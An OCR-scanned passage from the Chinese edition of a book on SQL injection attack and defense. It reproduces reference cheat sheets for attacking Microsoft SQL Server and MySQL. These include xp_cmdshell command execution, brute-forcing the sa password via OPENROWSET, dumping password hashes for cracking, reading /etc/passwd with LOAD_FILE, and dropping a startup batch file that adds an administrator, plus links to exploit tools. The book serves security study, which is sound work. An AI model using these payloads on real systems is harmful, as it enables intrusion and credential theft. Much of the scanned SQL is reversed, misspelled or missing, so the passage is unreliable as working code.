Microsoft SQL Server 6.5 SP5a Update
6.50.416
Mierosoft SQL Server 6.5 SP5a
6.50.415
Microsoft SQL Server 6.5 SP5
6.50.281
Microsof SQL Server 6.5 SP4
6.50.258
Microsoft SQL Server 6.5 SP3
6.50.240
Microsoft SQL Server 6.5 SP2
6.50.213
Microsoft SQL Server 6.5 SP1
6.50.201
Microsoft SQL Server 6.5 RTM
4.OPENROWSET重验证攻击
我们遇到过的很多MicrosoftSQL应用都配置成使用一个特定于该应用的用户账号，并且
该账号只拥有有限的权限。不过，相同的应用通常与一个拥有弱sa（系统管理员）账户口令的SQL
Server集成在一起。下列OPENROWSET查询将尝试使用口令为letmein的sa账户连接到地址
为 127.0.0.1 的 SQL Server:
FMTONLY OFF execute master. xp_cndshe11 *dir"*) --
可以使用一种为常用字典字查找口令值的脚本注入攻击来发动针对本地sa账户的攻击。
进一步讲，可以使用SQLServer的IP地址参数米遍历本地网络的IP范围以搜索带弱sa口令
的 SQL Server.
403
---
## Page 418
SQL注入攻击与防御（第2版）
提示：
www.portswiggernet上的 Burp Suite的 BurpIntruder 特性是执行这种攻击的理想之选。要
想发动针对sa用户账户的字典攻击，可使用带PresetList有效载荷集(payload set，包含一个常
用口令的列表）的sniper攻击类型，要想对本地SQLServer发动攻击，可使用numbers有效载
荷集遍历本地的IP范围。
默认情况下，SQLServer2005禁用了OPENROWSET函数。如果应用程序的用户是主数据
库master的拥有者(DBO)，那么可以重新启用它：
T*,suorado pooueape noue, oanbtguoods 3x3
EXEC sp_configure reconfigure
EXEC sp_configure reconfigure
5.攻击数据库服务器：MicrosoftSQLServer
下面详细描述针对数据库服务器主机的攻击，比如代码执行和本地文件访问。这里介绍的
所有攻击均假设是通过Intermet并借助SQL注入漏洞来攻击数据库服务器。
1）通过xp_cmdshell执行系统命令
Microsoft SQL Server 7、2000 和 2005 均包含一个名为 xp_cmdshell 的扩展存储过程，可以
通过调用该存储过程来执行操作系统命令。攻击SQLServer2000及之前的版本时，master数
据库的DBO（比如，sa用户)可以执行下列SQL语句：
EXEC master,dbo.xp_cmdsheI1 *os command*
SQLServer 2005默认情况下禁用了xp_cmdshell存储过程，必须首先使用下列SQL重新启
用它：
1',suotado peoueape oue,enbtguoods ax3
EXEC sp_configure reconfigure
EXEC sp_configure *xp_cndshe11', 1
EXEC sp_configure reconfigure
如果xp_cmdshell 存储过程已经被删除了，但.dll并未删除，那么可以使用下列SQL重新
启用它：
.TTp'octbedx, *,tteqspuo"dx, ooxdpapuaqxoppede 3x3
Tpo,botdx, '.tteqspuo"dx, ooxdpepueaxeppeds 0ax3
2)xp_cmdshell的替代方案
作为xp_cmdshell存储过程的替代方案，可以执行下列SQL语句来实现相同的效果：
DECLARE @altshel1 INT
要想在Microsoft SQLServer 2005上执行这个替代的 shell，首先要执行下列SQL：
404
---
## Page 419
第11章参考资料
EXEC sp_configure reconfigure
EXEC sp_configure reconfigure
3）破解数据库口令
Microsoft SQLServer2000的口令哈希存储在 sysxlogins表中，可以使用下列 SQL语句提
取它们：
SELECT user, password FROM master.dbo.sysxlogins
上述查询的结果看起来与下面内容类似：
Sa, 0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784
B911D76BF4EB124550ACABDFD1457
可以按下列方式剖析以0x0100开头的长字符串。位于0x后面的前4个字节是常量，接下
来的8个字节是salt(哈希盐）。本例中，salt的值是236A261C。剩下的80个字节实际上是两个
哈希：前40个字节是口令大小写敏感的哈希，后40个字节则是相应的大写字母版本。
下面是大小写敏感的哈希：
E12AB57BA22A7F44CE3B780E52098378B6585289
下面是大小写不敏感的哈希：
2EEE91C0784B911D76BF4EB124550ACABDFD1457
可以将salt和任意一个（或两个）口令哈希加载到Cain&Abel（www.oxid.it）中，以发动针对
口令的字典或暴力破解攻击。
4) Microsoft SQL Server 2005 哈希
MicrosoftSQLServer2005并不保存大小写不敏感的口令哈希版本：不过，大小写混合的
版本却仍然可以访问。以下 SQL语句会检索sa账户的口令哈希：
SELECT name + '-' + master.sys.fn_varbintohexstr (password_hash) from
master.sys.sql_logins
接下来的哈希值示例包括一个4字节的常量（0x0100)、一个8字节的salt（4086CEB6)和一
个40字节的大小写混合哈希（以D8277开头）：
0x01004086CEB6D8277477B39B7130D923F399C6FD3C6BD46A0365
5）文件读/写
如果拥有INSERT和ADMINISTER BULKOPERATIONS许可，就可以读取本地文件。下
列SQL语句会将本地文件c:boot.ini读取到localfile表中：
CREATE TABLE 1ocalfile (data varchar (8000)) ;
接下来可以使用SELECT语句从localfile表中取回数据。如果通过错误消息提取表数据，
就可能会受一次查询只能提取一行的限制。这种情况下，需要通过引用点来进行逐行选取。可
405
---
## Page 420
SQL注入攻击与防御（第2版）
以使用ALTERTABLE语句向 localfile表添加一个自动增长的 IDENTITY列。下列 SQL语句
会添加一个名为id的IDENTITY列，其初始值为1，它将随着表中的每一行逐渐递增：
ALTER TABLE 1ocalfIle ADD id INT IDENTITY (1, 1) :
现在可以通过引用id列来提取数据，例如：
SELECT data FROM 1ocalfile WHERE id - 1;
SELECT data FROM localfile WHERE id = 2;
SELECT data FROM 1ocalfile WHERE id = 3;
11.3.4MySQL备忘单
MySQL是一种流行的开源数据库平台，通常与PHP和RubyonRails应用一起实现。本节
1.枚举数据库配置信息和模式
表11-12列出了用于提取关键配置信息的SQL语句。表11-13列出了用于枚举MySQL5.0
及之后版本中模式信息的SQL语句。
表11-12提取MySQL服务器的配置信息
数
据
查询
版本
SELECT eeversion;
当前用户
SELECT user ();
SELECT system_user();
列出用户
SELECT user FROM mysql.user/
SELECT grantee, privilege_type, is_grantable
当前用户权限
FROM information_schema.user_privileges;
表11-13提取MySQL5.0及之后版本的模式信息
数
据
查
询
当前数据库
SELECT database () ;
列出数据库
SELECT schema_name FROM information_schema.schemata/
列出当前数据库中的表：
UNION SELECT TABLE_NAME FROM information_schema .tables WHERE
列出表
TABLE_SCHEMA= database () ;
列出所有用户自定义数据库中的所有表：
SELECT table_schema, tabble_name FRoM information_schema.tables
KHERE table_schema I= *information_schema* AND table_schema ↓=*mysq1 *
列出当前数据库中 tbIUsers 表的列名：
SELECT column_name FRoM information_schema .columns
WHERE table_name= 'tblUsers'#
返回tblUsers表所有列的列名
列出列
列出所有用户定义的数据库中的所有列：
SELECT table_schema, tabble_name, column_name FROM
information_schema.columns wHERE table_schema 1=
'information_schema′ AND table_schema !=*mysq1'
406
---
## Page 421
第11章参考资料
2.SQL盲注函数：MySQL
表11-14列出了执行SQL盲注攻击时一些非常有用的函数。
表11-14SQL盲注函数
数
据
查询
字符串长度
LENGTH ()
从给定字符串中提取子串
SELECT SUBSTR(string, offset, length);
字符串（ABC）不带单引号的表示方式
SELECT char (65, 66, 67) ;
BENCHMARK (1000000, MD5 (*HACK")) )
触发时间延迟
触发一个可度量的时间延迟
SLEEP (10) ;
触发一个10秒的时间延迟（MySQL5以及更高版本）
IF 语句
（.V.)T 
返回'A
3.攻击数据库服务器：MySQL
与MicrosoftSQLServer不同，MySQL并未包含任何可用于执行操作系统命令的内置存储
过程，不过有很多策略可用来引发远程系统访问。下面介绍一些为实现远程代码执行和（或）读
写本地文件所采用的策略。
1）执行系统命令
可以通过在目标服务器上创建一个定期执行的恶意脚本文件来执行操作系统命令。下列语
句用于从MySQL读取内容并将其写入本地文件中：
接下来的语句会在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的
管理员用户x：
dumpfile 'c:\\Documents and Settings\\A11 Users\\Start Menu\\Programs
\\Startup\\attack.bat'
工具与陷阱
借助UNIONSELECT安插特洛伊（Trojan）脚本
使用UNIONSELECT创建Trojan脚本时，必须在嵌入系统命令前向目标文件写入
原始SQL查询选择的所有数据，这祥会出问题，因为原始查询所选择的数据有可能阻止
Trojan脚本正确执行
为解决这一问题，请确保正在注入的查询不会返回任何数据，添加AND1=0可以
达到此目的
407
---
## Page 422
SQL注入攻击与防御（第2版）
2）破解数据库口令
只要当前用户账户拥有必需的权限（默认情况下，根用户账户拥有足够的权限），就可以从
mysql.user表中提取用户口令的哈希值。要想返回一个以冒号分隔的用户名和口令哈希值的列
表，可执行下列语句：
接下来可以使用Cain&Abel或John the Ripper(www.openwall.com/john/)米破解口令哈希。
3）直接攻击数据库
站点下载一个工具来执行该攻击：
●Windows: www.scoobygang.org/HiDDenWarez/mexec.pl
●Windows: www.0xdeadbeef.info/exploits/raptor_winudf.tgz
●基于 UNIX:www.0xdeadbeef.info/exploits/raptor_udf.c
4)读取文件
MySQL的LOAD_FILE函数会返回一个包含指定文件内容的字符串。数据库用户需要拥
有file_priv权限才能调用该函数。要想查看UNIX主机上的/etc/passwd文件，可使用下列语法：
SELECT LOAD_FILE(*/etc/passwd*) ;
如果启用了MAGIC_QUOTES_GPC，就可以使用十六进制字符申代表该文件路径以避免
SELECT LOAD_FILE(0x2f6574632f706173737764) :加载/etc/passwd
读取文件内容。可以从 www.ictsc.it/site/IT/projects/sqlDumper/sqlDumper.php 上下载到 SqlDumper。